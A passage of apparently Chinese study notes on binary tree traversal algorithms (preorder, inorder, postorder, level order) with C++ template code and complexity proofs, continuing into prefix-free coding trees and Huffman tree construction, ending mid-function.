<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> VST&gt; <span class="comment">//元素类型、操作器</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">travPre_I1</span> <span class="params">( BinNodePosi(T) x, VST&amp; visit )</span> </span>&#123; <span class="comment">//二叉树先序遍历算法（迭代版#1）</span></span><br><span class="line">   Stack&lt;BinNodePosi(T)&gt; S; <span class="comment">//辅助栈</span></span><br><span class="line">   <span class="keyword">if</span> ( x ) S.push ( x ); <span class="comment">//根节点入栈</span></span><br><span class="line">   <span class="keyword">while</span> ( !S.empty() ) &#123; <span class="comment">//在栈变空之前反复循环</span></span><br><span class="line">      x = S.pop(); visit ( x-&gt;data ); <span class="comment">//弹出并访问当前节点，其非空孩子的入栈次序为先右后左</span></span><br><span class="line">      <span class="keyword">if</span> ( HasRChild ( *x ) ) S.push ( x-&gt;rc ); <span class="keyword">if</span> ( HasLChild ( *x ) ) S.push ( x-&gt;lc );</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先序遍历序列可分为两段：</p>
<ul>
<li>沿最左侧通路自顶而下访问的各节点</li>
<li>自底而上访问遍历的对应右子树</li>
</ul>
<p>借助栈逆序记录最左侧通路上的节点的右子树，以确定对应右子树自底而上的遍历次序。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> VST&gt; <span class="comment">//元素类型、操作器</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">travPre_I2</span> <span class="params">( BinNodePosi(T) x, VST&amp; visit )</span> </span>&#123; <span class="comment">//二叉树先序遍历算法（迭代版#2）</span></span><br><span class="line">   Stack&lt;BinNodePosi(T)&gt; S; <span class="comment">//辅助栈</span></span><br><span class="line">   <span class="keyword">while</span> ( <span class="literal">true</span> ) &#123;</span><br><span class="line">      visitAlongLeftBranch ( x, visit, S ); <span class="comment">//从当前节点出发，逐批访问</span></span><br><span class="line">      <span class="keyword">if</span> ( S.empty() ) <span class="keyword">break</span>; <span class="comment">//直到栈空</span></span><br><span class="line">      x = S.pop(); <span class="comment">//弹出下一批的起点</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//从当前节点出发，沿左分支不断深入，直至没有左分支的节点；沿途节点遇到后立即访问</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> VST&gt; <span class="comment">//元素类型、操作器</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">visitAlongLeftBranch</span> <span class="params">( BinNodePosi(T) x, VST&amp; visit, Stack&lt;BinNodePosi(T)&gt;&amp; S )</span> </span>&#123;</span><br><span class="line">   <span class="keyword">while</span> ( x ) &#123;</span><br><span class="line">      visit ( x-&gt;data ); <span class="comment">//访问当前节点</span></span><br><span class="line">      S.push ( x-&gt;rc ); <span class="comment">//右孩子入栈暂存（可优化：通过判断，避免空的右孩子入栈）</span></span><br><span class="line">      x = x-&gt;lc;  <span class="comment">//沿左分支深入一层</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h1><h2 id="递归版-1"><a href="#递归版-1" class="headerlink" title="递归版"></a>递归版</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> VST&gt; <span class="comment">//元素类型、操作器</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">travIn_R</span> <span class="params">( BinNodePosi(T) x, VST&amp; visit )</span> </span>&#123; <span class="comment">//二叉树中序遍历算法（递归版）</span></span><br><span class="line">   <span class="keyword">if</span> ( !x ) <span class="keyword">return</span>;</span><br><span class="line">   travIn_R ( x-&gt;lc, visit );</span><br><span class="line">   visit ( x-&gt;data );</span><br><span class="line">   travIn_R ( x-&gt;rc, visit );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="迭代版-1"><a href="#迭代版-1" class="headerlink" title="迭代版"></a>迭代版</h2><p>与之前的先序遍历算法不同，沿最左侧分支下行时只是将对应的节点压栈，并没有执行访问操作。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">//从当前节点出发，沿左分支不断深入，直至没有左分支的节点</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">goAlongLeftBranch</span> <span class="params">( BinNodePosi(T) x, Stack&lt;BinNodePosi(T)&gt;&amp; S )</span> </span>&#123;</span><br><span class="line">   <span class="keyword">while</span> ( x ) &#123; S.push ( x ); x = x-&gt;lc; &#125; <span class="comment">//当前节点入栈后随即向左侧分支深入，迭代直到无左孩子</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> VST&gt; <span class="comment">//元素类型、操作器</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">travIn_I1</span> <span class="params">( BinNodePosi(T) x, VST&amp; visit )</span> </span>&#123; <span class="comment">//二叉树中序遍历算法（迭代版#1）</span></span><br><span class="line">   Stack&lt;BinNodePosi(T)&gt; S; <span class="comment">//辅助栈</span></span><br><span class="line">   <span class="keyword">while</span> ( <span class="literal">true</span> ) &#123;</span><br><span class="line">      goAlongLeftBranch ( x, S ); <span class="comment">//从当前节点出发，逐批入栈</span></span><br><span class="line">      <span class="keyword">if</span> ( S.empty() ) <span class="keyword">break</span>; <span class="comment">//直至所有节点处理完毕</span></span><br><span class="line">      x = S.pop(); visit ( x-&gt;data ); <span class="comment">//弹出栈顶节点并访问之</span></span><br><span class="line">      x = x-&gt;rc; <span class="comment">//转向右子树</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将上一版等价地描述以下版本：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> VST&gt; <span class="comment">//元素类型、操作器</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">travIn_I2</span> <span class="params">( BinNodePosi(T) x, VST&amp; visit )</span> </span>&#123; <span class="comment">//二叉树中序遍历算法（迭代版#2）</span></span><br><span class="line">   Stack&lt;BinNodePosi(T)&gt; S; <span class="comment">//辅助栈</span></span><br><span class="line">   <span class="keyword">while</span> ( <span class="literal">true</span> )</span><br><span class="line">      <span class="keyword">if</span> ( x ) &#123;</span><br><span class="line">         S.push ( x ); <span class="comment">//根节点进栈</span></span><br><span class="line">         x = x-&gt;lc; <span class="comment">//深入遍历左子树</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( !S.empty() ) &#123;</span><br><span class="line">         x = S.pop(); <span class="comment">//尚未访问的最低祖先节点退栈</span></span><br><span class="line">         visit ( x-&gt;data ); <span class="comment">//访问该祖先节点</span></span><br><span class="line">         x = x-&gt;rc; <span class="comment">//遍历祖先的右子树</span></span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">         <span class="keyword">break</span>; <span class="comment">//遍历完成</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上版需借助辅助栈，所需辅助空间正比于二叉树的高度，在最坏情况下与节点数目相当。借助<code>BinNode</code>对象内部的<code>parent</code>指针，以下版本仅需要常数辅助空间，属于就地算法。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> VST&gt; <span class="comment">//元素类型、操作器</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">travIn_I3</span> <span class="params">( BinNodePosi(T) x, VST&amp; visit )</span> </span>&#123; <span class="comment">//二叉树中序遍历算法（迭代版#3，无需辅助栈）</span></span><br><span class="line">   <span class="keyword">bool</span> backtrack = <span class="literal">false</span>; <span class="comment">//前一步是否刚从右子树回溯——省去栈，仅O(1)辅助空间</span></span><br><span class="line">   <span class="keyword">while</span> ( <span class="literal">true</span> )</span><br><span class="line">      <span class="keyword">if</span> ( !backtrack &amp;&amp; HasLChild ( *x ) ) <span class="comment">//若有左子树且不是刚刚回溯，则</span></span><br><span class="line">         x = x-&gt;lc; <span class="comment">//深入遍历左子树</span></span><br><span class="line">      <span class="keyword">else</span> &#123; <span class="comment">//否则——无左子树或刚刚回溯（相当于无左子树）</span></span><br><span class="line">         visit ( x-&gt;data ); <span class="comment">//访问该节点</span></span><br><span class="line">         <span class="keyword">if</span> ( HasRChild ( *x ) ) &#123; <span class="comment">//若其右子树非空，则</span></span><br><span class="line">            x = x-&gt;rc; <span class="comment">//深入右子树继续遍历</span></span><br><span class="line">            backtrack = <span class="literal">false</span>; <span class="comment">//并关闭回溯标志</span></span><br><span class="line">         &#125; <span class="keyword">else</span> &#123; <span class="comment">//若右子树空，则</span></span><br><span class="line">            <span class="keyword">if</span> ( ! ( x = x-&gt;succ() ) ) <span class="keyword">break</span>; <span class="comment">//回溯（含抵达末节点时的退出返回）</span></span><br><span class="line">            backtrack = <span class="literal">true</span>; <span class="comment">//并设置回溯标志</span></span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; BinNodePosi(T) BinNode&lt;T&gt;::succ() &#123; <span class="comment">//定位节点v的直接后继</span></span><br><span class="line">   BinNodePosi(T) s = <span class="keyword">this</span>; <span class="comment">//记录后继的临时变量</span></span><br><span class="line">   <span class="keyword">if</span> ( rc ) &#123; <span class="comment">//若有右孩子，则直接后继必在右子树中，具体地就是</span></span><br><span class="line">      s = rc; <span class="comment">//右子树中</span></span><br><span class="line">      <span class="keyword">while</span> ( HasLChild ( *s ) ) s = s-&gt;lc; <span class="comment">//最靠左（最小）的节点</span></span><br><span class="line">   &#125; <span class="keyword">else</span> &#123; <span class="comment">//否则，直接后继应是“将当前节点包含于其左子树中的最低祖先”，具体地就是</span></span><br><span class="line">      <span class="keyword">while</span> ( IsRChild ( *s ) ) s = s-&gt;parent; <span class="comment">//逆向地沿右向分支，不断朝左上方移动</span></span><br><span class="line">      s = s-&gt;parent; <span class="comment">//最后再朝右上方移动一步，即抵达直接后继（如果存在）</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此版相当于将原辅助栈替换为一个标志位<code>backtrack</code>，标志是否有从下而上的回溯。若不是，则按照中序遍历的策略优先遍历左子树，否则，则意味着当前左子树已访问完毕，访问当前节点后深入右子树。</p>
<p>改进该算法，无需辅助栈，也无需辅助标志位。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> VST&gt; <span class="comment">//元素类型、操作器</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">travIn_I4</span> <span class="params">( BinNodePosi(T) x, VST&amp; visit )</span> </span>&#123; <span class="comment">//二叉树中序遍历（迭代版#4，无需栈或标志位）</span></span><br><span class="line">   <span class="keyword">while</span> ( <span class="literal">true</span> )</span><br><span class="line">      <span class="keyword">if</span> ( HasLChild ( *x ) ) <span class="comment">//若有左子树，则</span></span><br><span class="line">         x = x-&gt;lc; <span class="comment">//深入遍历左子树</span></span><br><span class="line">      <span class="keyword">else</span> &#123; <span class="comment">//否则</span></span><br><span class="line">         visit ( x-&gt;data ); <span class="comment">//访问当前节点，并</span></span><br><span class="line">         <span class="keyword">while</span> ( !HasRChild ( *x ) ) <span class="comment">//不断地在无右分支处</span></span><br><span class="line">            <span class="keyword">if</span> ( ! ( x = x-&gt;succ() ) ) <span class="keyword">return</span>; <span class="comment">//回溯至直接后继（在没有后继的末节点处，直接退出）</span></span><br><span class="line">            <span class="keyword">else</span> visit ( x-&gt;data ); <span class="comment">//访问新的当前节点</span></span><br><span class="line">         x = x-&gt;rc; <span class="comment">//（直至有右分支处）转向非空的右子树</span></span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>无论二叉树的规模如何，对succ()接口所有调用所需时间总和不超过O(n)</p>
</blockquote>
<p>在这一场合对<code>succ</code>的调用，其中if判断语句必然取else分支，因此，算法所消耗的所有时间应线性正比于其中while循环的部署，即其中对<code>parent</code>引用的访问次数。数学归纳法对树高归纳可证明对<code>parent</code>引用不超过$n$次。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> VST&gt; <span class="comment">//元素类型、操作器</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">travIn_I3</span> <span class="params">( BinNodePosi(T) x, VST&amp; visit )</span> </span>&#123; <span class="comment">//二叉树中序遍历算法（迭代版#3，无需辅助栈）</span></span><br><span class="line">   <span class="keyword">bool</span> backtrack = <span class="literal">false</span>; <span class="comment">//前一步是否刚从右子树回溯——省去栈，仅O(1)辅助空间</span></span><br><span class="line">   <span class="keyword">while</span> ( <span class="literal">true</span> )</span><br><span class="line">      <span class="keyword">if</span> ( !backtrack &amp;&amp; HasLChild ( *x ) ) <span class="comment">//若有左子树且不是刚刚回溯，则</span></span><br><span class="line">         x = x-&gt;lc; <span class="comment">//深入遍历左子树</span></span><br><span class="line">      <span class="keyword">else</span> &#123; <span class="comment">//否则——无左子树或刚刚回溯（相当于无左子树）</span></span><br><span class="line">         visit ( x-&gt;data ); <span class="comment">//访问该节点</span></span><br><span class="line">         <span class="keyword">if</span> ( HasRChild ( *x ) ) &#123; <span class="comment">//若其右子树非空，则</span></span><br><span class="line">            x = x-&gt;rc; <span class="comment">//深入右子树继续遍历</span></span><br><span class="line">            backtrack = <span class="literal">false</span>; <span class="comment">//并关闭回溯标志</span></span><br><span class="line">         &#125; <span class="keyword">else</span> &#123; <span class="comment">//若右子树空，则</span></span><br><span class="line">            <span class="keyword">if</span> ( ! ( x = x-&gt;succ() ) ) <span class="keyword">break</span>; <span class="comment">//回溯（含抵达末节点时的退出返回）</span></span><br><span class="line">            backtrack = <span class="literal">true</span>; <span class="comment">//并设置回溯标志</span></span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>每个节点都仅在左子树被访问完成后接受访问，所以只访问一次。</p>
<p>另外，此处并未显式地使用复杂的辅助结构，表面上看只需要常数辅助空间，但是相比于其余算法，该算法要求每个算法均有<code>parent</code>指针，仍为$O(n)$空间。</p>
<h1 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h1><h2 id="递归版-2"><a href="#递归版-2" class="headerlink" title="递归版"></a>递归版</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> VST&gt; <span class="comment">//元素类型、操作器</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">travPost_R</span> <span class="params">( BinNodePosi(T) x, VST&amp; visit )</span> </span>&#123; <span class="comment">//二叉树后序遍历算法（递归版）</span></span><br><span class="line">   <span class="keyword">if</span> ( !x ) <span class="keyword">return</span>;</span><br><span class="line">   travPost_R ( x-&gt;lc, visit );</span><br><span class="line">   travPost_R ( x-&gt;rc, visit );</span><br><span class="line">   visit ( x-&gt;data );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="迭代版-2"><a href="#迭代版-2" class="headerlink" title="迭代版"></a>迭代版</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">//在以S栈顶节点为根的子树中，找到最高左侧可见叶节点</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">gotoHLVFL</span> <span class="params">( Stack&lt;BinNodePosi(T)&gt;&amp; S )</span> </span>&#123; <span class="comment">//沿途所遇节点依次入栈</span></span><br><span class="line">   <span class="keyword">while</span> ( BinNodePosi(T) x = S.top() ) <span class="comment">//自顶而下，反复检查当前节点（即栈顶）</span></span><br><span class="line">      <span class="keyword">if</span> ( HasLChild ( *x ) ) &#123; <span class="comment">//尽可能向左</span></span><br><span class="line">         <span class="keyword">if</span> ( HasRChild ( *x ) ) S.push ( x-&gt;rc ); <span class="comment">//若有右孩子，优先入栈</span></span><br><span class="line">         S.push ( x-&gt;lc ); <span class="comment">//然后才转至左孩子</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="comment">//实不得已</span></span><br><span class="line">         S.push ( x-&gt;rc ); <span class="comment">//才向右</span></span><br><span class="line">   S.pop(); <span class="comment">//返回之前，弹出栈顶的空节点</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> VST&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">travPost_I</span> <span class="params">( BinNodePosi(T) x, VST&amp; visit )</span> </span>&#123; <span class="comment">//二叉树的后序遍历（迭代版）</span></span><br><span class="line">   Stack&lt;BinNodePosi(T)&gt; S; <span class="comment">//辅助栈</span></span><br><span class="line">   <span class="keyword">if</span> ( x ) S.push ( x ); <span class="comment">//根节点入栈</span></span><br><span class="line">   <span class="keyword">while</span> ( !S.empty() ) &#123;</span><br><span class="line">      <span class="keyword">if</span> ( S.top() != x-&gt;parent ) <span class="comment">//若栈顶非当前节点之父（则必为其右兄），此时需</span></span><br><span class="line">         gotoHLVFL ( S ); <span class="comment">//在以其右兄为根之子树中，找到HLVFL（相当于递归深入其中）</span></span><br><span class="line">      x = S.pop(); visit ( x-&gt;data ); <span class="comment">//弹出栈顶（即前一节点之后继），并访问之</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在后续遍历序列中，栈顶元素应后于栈顶子树访问，所以后序遍历序列并不是访问栈顶元素，而是先判断对应子树是否遍历，若遍历再访问栈顶元素。</p>
<p>在迭代版后序遍历算法运行中，树中每一层至多有两个节点存在栈中，故栈结构最大规模不超过二叉树深度的两倍，最坏情况下为$O(n)$。</p>
<h1 id="层次遍历"><a href="#层次遍历" class="headerlink" title="层次遍历"></a>层次遍历</h1><p>递归的形式类似于栈，层次遍历的顺序与栈访问顺序有所不同，所以借助与栈对称的队列结构实现层次遍历。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">template</span> &lt;<span class="keyword">typename</span> VST&gt; <span class="comment">//元素类型、操作器</span></span><br><span class="line"><span class="keyword">void</span> BinNode&lt;T&gt;::travLevel ( VST&amp; visit ) &#123; <span class="comment">//二叉树层次遍历算法</span></span><br><span class="line">   Queue&lt;BinNodePosi(T)&gt; Q; <span class="comment">//辅助队列</span></span><br><span class="line">   Q.enqueue ( <span class="keyword">this</span> ); <span class="comment">//根节点入队</span></span><br><span class="line">   <span class="keyword">while</span> ( !Q.empty() ) &#123; <span class="comment">//在队列再次变空之前，反复迭代</span></span><br><span class="line">      BinNodePosi(T) x = Q.dequeue(); visit ( x-&gt;data ); <span class="comment">//取出队首节点并访问之</span></span><br><span class="line">      <span class="keyword">if</span> ( HasLChild ( *x ) ) Q.enqueue ( x-&gt;lc ); <span class="comment">//左孩子入队</span></span><br><span class="line">      <span class="keyword">if</span> ( HasRChild ( *x ) ) Q.enqueue ( x-&gt;rc ); <span class="comment">//右孩子入队</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>队列中所存节点的深度不超过1，故最大规模不超过二叉树任一的相邻两层的规模之和。</p>
<blockquote>
<p>只要辅助队列Q的容量不低于$\lceil n/2 \rceil$ ,就不会出现中途溢出的问题</p>
</blockquote>
<p>在算法的每一步迭代过程中，若当前至少有$n$各个元素入过队，则在队中的至多$\lceil n/2 \rceil$,相应地，至少有$\lfloor n/2 \rfloor$个已经出队。每次迭代都会有一个节点出队，若该节点的度数为$d(0&lt;=d&lt;=2)$，则随即会有$d$个节点入队，通过对已出队的节点做数学归纳可证。</p>
<p>在算法的任一时刻，辅助队列的规模均不至小于仍在队列中节点的数目。为了使仍在队列中节点数目占当前入过队节点比重尽可能大，此前所有出队节点度数都必须取作最大的2，且中途一旦某个节点只有1度甚至0度，则不可能恢复到这一比重，即当树为规模为n的完全二叉树时需要如此大容量的队列。</p>
<p>在整个遍历过程中，规模为$n$的完全二叉树为单峰对称的，即</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;0,1,2,..(n+1)&#x2F;2,...,2,1,0&#125;</span><br><span class="line">&#123;0,1,2,..n&#x2F;2,n&#x2F;2,...,2,1,0&#125;</span><br></pre></td></tr></table></figure>
<p>$n$为偶数时，最后一个内部节点度数为1，入一出一，所以队列规模不变。</p>
<h2 id="完全二叉树"><a href="#完全二叉树" class="headerlink" title="完全二叉树"></a>完全二叉树</h2><p>叶节点仅限于最低两层</p>
<p>底层叶子均居于次底层叶子左侧，除末节点的父亲，内部节点均有叶子。</p>
<p>叶节点不致少于内部节点，但至多多出一个。</p>
<p>分为两种情况：</p>
<ul>
<li><strong>各节点均为二度节点</strong> $n_0=n_1+n_2+1=n_2+1$</li>
<li><strong>有一节点为一度</strong> $n_0=n_2+1=n_2+n_1$</li>
</ul>
<blockquote>
<p>这些算法的确会访问每个节点一次且仅一次</p>
</blockquote>
<p>只要某个节点可以被访问到，则其孩子节点必然也能</p>
<p>由此进一步可知：只要某个节点能被访问到，则其每个后代节点必然也能。于是特别地，作为根节点地后代，树中所有节点都能被起始于根节点的遍历访问到。</p>
<p>另外一方面，任何节点仅被访问一次。</p>
<p>除了层次遍历算法和中序遍历算法均借助辅助栈进行访问，注意到每个节点都在且仅在刚刚出栈后，随即被访问。每个节点各自仅入栈一次，即可确定每个节点的确至多被访问一次。</p>
<p>层次遍历算法和中序遍历算法未使用到栈结构，性质类似。</p>
<blockquote>
<p>这些算法都具有线性时间复杂度</p>
</blockquote>
<p>这些算法的运行时间主要消耗于两个部分：</p>
<ul>
<li>栈(队列)操作</li>
<li>对节点的访问操作</li>
</ul>
<p>以上操作对每个节点而言均为常数次，所以总体而言，这些算法具有线性时间复杂度。</p>
<blockquote>
<p>递推方程分析</p>
</blockquote>
<p>$T(n)=T(n-a-1)+T(a)+O(1)$</p>
<p>每递归一层，等效于将当前问题分解为两个子问题，递归基只需常数时间，同样可以得出这些算法具有线性复杂度的结论。</p>
<h1 id="二叉编码树"><a href="#二叉编码树" class="headerlink" title="二叉编码树"></a>二叉编码树</h1><p>通讯理论中一个基本的问题是：如何在尽可能低的成本的情况下，以尽可能高的速度，尽可能忠实地实现信息在空间和时间上的复制和转移。在现代通讯技术中，无论采用电、磁、光、电或其他任何形式，在信道上传递的信息大多以二进制比特的形式表示和存在，而每一个具体的编码方案都对应于一棵二叉编码树。</p>
<p>在加载到信道上之前，信息被转换为二进制的过程被称为编码，反之，信道抵达目标后再由二进制编码回复原始信息的过程被称为解码。</p>
<p>任一编码方案都可描述为一棵二叉树：从根节点出发，每次向左(右)对应一个0(1)比特位。各字符分别存放于对应的叶子中。字符x的编码串rps(v(x))=rps(x)由根到v(x)的通路确定。</p>
<p>字符编码不必等长，所有字符都对应于叶节点，不存在解码歧义现象，为前缀无歧义编码，不同字符的编码互不为前缀，故不致歧义，此为可行的PFC编码方案。</p>
<blockquote>
<p>若采用PFC编码，则无论二进制编码串的长度与内容如何，解码过程总能持续进行</p>
</blockquote>
<p>整个解码过程就是在PFC编码树上的下行过程，从根节点出发，根据编码串的当前编码相应地向左(比特0)或向右(比特1)深入，一旦抵达叶节点，则输出其对应的字符，并随即复位至根节点。</p>
<p>可见，算法无法继续的唯一可能情况为，在准备向下深入时没有发现对应的分支，然而根据定义和约束条件，PFC编码树必然是真二叉树，每一内部节点必然拥有左、右分支，因此上述情况不可能发生。</p>
<p>解码过程不必回溯，若因为信道干扰等因素导致某个比特位翻转错误，尽管解码依然可进行，但是后续所有字符的解码都会出现错误。</p>
<h2 id="最优编码树"><a href="#最优编码树" class="headerlink" title="最优编码树"></a>最优编码树</h2><p>在实际的通讯系统中，信道的使用效率很大程度上取决于编码本身的效率。比如，高效的算法生成的编码串应尽可能短。</p>
<p>字符x的编码长度|rps(x)|为其对应叶节点的深度depth(v(x))。于是，各字符的平均编码长度就是编码树T中的叶节点平均深度。</p>
<p>$ald(T)=\sum_{x\in \sum}|rps(x)|/|\sum|=\sum_{x\in \sum}depth(x)/|\sum|$</p>
<p>平均编码长度是反应编码效率的重要指标，我们尽可能希望这一指标小。同一字符集的所有编码方案中，平均编码长度最小者被称为最优方案，对应编码树的ald()值达到最小，故称之为最优编码树，简称最优编码树。对于任一字符集，最优编码树必然存在。</p>
<p><strong>双子性</strong></p>
<p>最优编码树必然为真二叉树，内部节点的左、右孩子全双，不然，假设其中内部节点p有唯一的孩子x，则将p删除并代之以子树x。除了子树中所有叶节点的编码长度统一缩短一层外，其余叶节点的编码长度不变，相比于之前的编码树平均编码长度必然更短。</p>
<p><strong>层次性</strong></p>
<p>叶节点位置深度之差不超过1，类似双子性的证明，替换后可得到的编码树平均编码长度更短，不符合最优编码树的原则。</p>
<p><strong>不唯一性</strong></p>
<p>对于任一内部节点而言，左右子树互换之后平均编码长度不变。</p>
<p><strong>最优编码树的构造</strong></p>
<p>真完全树为最优编码树，可直接导出构造最优编码树的算法：创建一棵规模为$2|\sum|-1$的完全二叉树T，将$\sum$中的字符任意分配给T的$|\sum|$个节点。</p>
<blockquote>
<p>若不同序列作为输出的概率均等，则任何CBA式排序算法平均运行时间仍然为$\Omega(nlogn)$</p>
</blockquote>
<p>针对CBA式算法复杂度的下界估计，统一方法为：</p>
<ul>
<li>确定算法所对应的比较树</li>
<li>通过输入规模与可能的输出结果(叶节点)数目推算出最小树高</li>
</ul>
<p>在各种输出结果符合某种概率分布的情况下，算法的平均性能，则等效于比较树中各叶节点的加权平均深度。</p>
<p>最优编码树在各种输出结果均等的情况下，对于任一固定输入规模n，完全二叉树的叶节点平均深度可达到最小。</p>
<h2 id="huffman编码树"><a href="#huffman编码树" class="headerlink" title="huffman编码树"></a>huffman编码树</h2><p>以上最优编码树算法假定各个字符在文本串中出现的次数相等，而这一条件往往不满足，甚至不确定。</p>
<p>若考虑字符各自出现频率，则可将带权平均编码长度取作编码树T的叶节点带权平均深度，即是</p>
<p>$wald(T)=\sum_{x\in \sum}p(x)|rps(x)|$</p>
<p>此时，完全二叉编码树并不是wald值最短。</p>
<p><strong>最优带权编码树</strong></p>
<p>频率高的超字符，应尽可能放在高/低处。</p>
<p>同样，huffman编码树满足层次性、双子性、不唯一性。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">HuffTree* <span class="title">minHChar</span> <span class="params">( HuffForest* forest )</span> </span>&#123; <span class="comment">//在Huffman森林中找出权重最小的（超）字符</span></span><br><span class="line">   ListNodePosi ( HuffTree* ) p = forest-&gt;first(); <span class="comment">//从首节点出发查找</span></span><br><span class="line">   ListNodePosi ( HuffTree* ) minChar = p; <span class="comment">//最小Huffman树所在的节点位置</span></span><br><span class="line">   <span class="keyword">int</span> minWeight = p-&gt;data-&gt;root()-&gt;data.weight; <span class="comment">//目前的最小权重</span></span><br><span class="line">   <span class="keyword">while</span> ( forest-&gt;valid ( p = p-&gt;succ ) ) <span class="comment">//遍历所有节点</span></span><br><span class="line">      <span class="keyword">if</span> ( minWeight &gt; p-&gt;data-&gt;root()-&gt;data.weight ) <span class="comment">//若当前节点所含树更小，则</span></span><br><span class="line">         &#123;  minWeight = p-&gt;data-&gt;root()-&gt;data.weight; minChar = p;  &#125; <span class="comment">//更新记录</span></span><br><span class="line">   <span class="keyword">return</span> forest-&gt;remove ( minChar ); <span class="comment">//将挑选出的Huffman树从森林中摘除，并返回</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">HuffTree* <span class="title">generateTree</span> <span class="params">( HuffForest* forest )</span> </span>&#123; <span class="comment">//Huffman编码算法</span></span><br><span class="line">   <span class="keyword">while</span> ( <span class="number">1</span> &lt; forest-&gt;size() ) &#123;</span><br><span class="line">      HuffTree* T1 = minHChar ( forest ); HuffTree* T2 = minHChar ( forest );</span><br><span class="line">      HuffTree* S = <span class="keyword">new</span> HuffTree(); </span><br><span class="line">      S-&gt;insertAsRoot ( HuffChar ( <span class="string">&#x27;^&#x27;</span>, T1-&gt;root()-&gt;data.weight + T2-&gt;root()-&gt;data.weight ) );</span><br><span class="line">      S-&gt;attachAsLC ( S-&gt;root(), T1 ); S-&gt;attachAsRC ( S-&gt;root(), T2 );</span><br><span class="line">      forest-&gt;insertAsLast ( S ); </span><br><span class="line">   &#125; <span class="comment">//assert: 循环结束时，森林中唯一（列表首节点中）的那棵树即Huffman编码树</span></span><br><span class="line">   <span class="keyword">return</span> forest-&gt;first()-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="comment">//通过遍历获取各字符的编码</span></span><br><span class="line">generateCT ( Bitmap* code, <span class="keyword">int</span> length, HuffTable* table, BinNodePosi ( HuffChar ) v ) 